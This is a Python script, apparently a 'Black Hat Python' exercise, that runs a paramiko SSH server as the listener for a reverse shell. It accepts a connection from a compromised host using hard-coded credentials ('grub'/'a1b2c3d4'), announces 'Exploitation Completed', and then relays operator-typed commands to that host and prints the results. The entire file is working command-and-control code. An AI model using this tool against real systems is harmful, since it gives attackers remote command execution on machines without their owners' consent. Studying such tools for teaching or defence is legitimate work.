import paramiko
import subprocess
import threading
import sys
import socket

host_key = paramiko.RSAKey(filename='/home/strike/Black_Hat_Python/test_rsa.key',password=None)

class Server(paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
	
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
	
	def check_auth_password(self, username, password):
		if (username=='grub') and (password=='a1b2c3d4'):
			return paramiko.AUTH_SUCCESSFUL
		
		return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = int(sys.argv[2])
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	
	sock.bind((server, ssh_port))
	sock.listen(5)
	print('[+] Listening for connection...')
	client, addr = sock.accept()

except:
	print('[-] Listening Failed')
	sys.exit(1)

print('[+] Got a connection!')
try:
	session = paramiko.Transport(client)
	session.add_server_key(host_key)
	server = Server()
	try:
		session.start_server(server=server)
	
	except:
		print('[-] SSH negotiation failed.')
		sys.exit(1)
	
	chan = session.accept(20)
	print('[+] Authenticating...!')
	print(chan.recv(1024).decode())
	chan.send(b'[+] Exploitation Completed')
	while True:
		try:
			command = input('Enter Command: ').strip('\n')
			if command != 'exit':
				chan.send(command)
				print(chan.recv(1024).decode() + '\n')
			else:
				chan.send(b'exit')
				print('[-] Exiting...')
				session.close()
				raise Exception('exit')
		
		except KeyboardInterrupt:
			session.close()

except:
	print('[-] Connection Ended Automatically')
	try:
		session.close()
		pass
	
	except:
		sys.exit(0)
